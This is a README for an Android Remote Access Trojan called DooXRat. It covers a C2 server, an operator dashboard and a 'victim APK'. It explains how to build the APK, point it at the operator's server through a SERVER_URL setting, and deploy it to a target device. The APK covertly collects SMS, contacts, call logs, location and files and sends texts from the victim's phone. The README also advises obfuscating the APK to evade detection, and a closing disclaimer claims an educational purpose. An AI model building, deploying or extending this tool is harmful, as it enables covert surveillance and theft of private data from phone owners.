# DooXRat - Full Stack Android RAT System

Complete Remote Access Trojan system with C2 server, web dashboard, and victim APK.

## Architecture

```
DooXRat/
├── backend/          # Node.js C2 Server (Socket.io + REST API)
├── dashboard/        # React Admin Panel
└── victim-app/       # Flutter Android APK
```

## Features

### C2 Server
- Real-time Socket.io communication
- REST API for data retrieval
- Multi-victim management
- File upload/download
- Command execution

### Dashboard
- Live victim monitoring
- SMS/Contacts/Call logs viewer
- Location tracking
- File browser
- App manager
- Dark themed UI

### Victim APK
- Auto permission request
- Background persistence
- Boot receiver
- Data collection:
  - SMS messages
  - Contacts
  - Call logs
  - GPS location
  - Installed apps
  - File system
- Remote commands:
  - Send SMS
  - Vibrate
  - Data exfiltration

## Installation

### 1. Backend Setup

```bash
cd backend
npm install
npm start
```

Server runs on `http://0.0.0.0:5000`

**Default credentials:**
- Username: `admin`
- Password: `DooXRat2026!`

### 2. Dashboard Setup

```bash
cd dashboard
npm install
npm start
```

Dashboard runs on `http://localhost:3000`

### 3. Victim APK Build

**Requirements:**
- Flutter SDK 3.x
- Android SDK
- Java 11+

```bash
cd victim-app

# Edit SERVER_URL in lib/services/rat_service.dart
# Change 'YOUR_SERVER_IP' to your actual server IP

flutter pub get
flutter build apk --release
```

APK output: `victim-app/build/app/outputs/flutter-apk/app-release.apk`

## Configuration

### Backend (.env)
```env
PORT=5000
JWT_SECRET=dooxrat_secret_key_2026_brutal
ADMIN_USERNAME=admin
ADMIN_PASSWORD=DooXRat2026!
```

### Victim APK
Edit `victim-app/lib/services/rat_service.dart`:
```dart
static const String SERVER_URL = 'http://YOUR_SERVER_IP:5000';
```

## Usage

1. Start backend server
2. Start dashboard (login with admin credentials)
3. Build and deploy victim APK to target device
4. Monitor victims in dashboard
5. Click "Control" to access victim details
6. Execute commands via tabs (SMS, Contacts, Location, etc.)

## Security Notes

- Change default admin password in `.env`
- Use HTTPS in production (add SSL certificates)
- Implement rate limiting for API endpoints
- Add authentication middleware for sensitive routes
- Obfuscate APK before deployment

## Network Setup

### Local Testing
```bash
# Get your local IP
ip addr show | grep inet

# Update SERVER_URL in victim APK
# Ensure firewall allows port 5000
```

### Production Deployment
```bash
# Use reverse proxy (nginx/apache)
# Add SSL certificates
# Configure domain DNS
# Update CORS settings in backend
```

## Commands Available

| Command | Description |
|---------|-------------|
| `get_sms` | Fetch SMS messages |
| `get_contacts` | Fetch contacts list |
| `get_call_logs` | Fetch call history |
| `get_location` | Get GPS coordinates |
| `get_apps` | List installed apps |
| `get_files` | Browse file system |
| `send_sms` | Send SMS from victim device |
| `vibrate` | Trigger device vibration |

## Troubleshooting

### APK won't connect
- Check SERVER_URL is correct
- Verify server is running
- Check firewall rules
- Ensure victim has internet connection

### Permissions denied
- APK must be installed (not run via ADB)
- User must grant all permissions manually
- Some permissions require device settings

### Build errors
- Run `flutter doctor` to check SDK
- Update Flutter: `flutter upgrade`
- Clean build: `flutter clean && flutter pub get`

## Legal Disclaimer

This tool is for **educational and authorized security testing only**.

Unauthorized access to computer systems is illegal. Only use on devices you own or have explicit permission to test. The author assumes no liability for misuse.

---

**DooXRat** - Built for red team research and penetration testing.
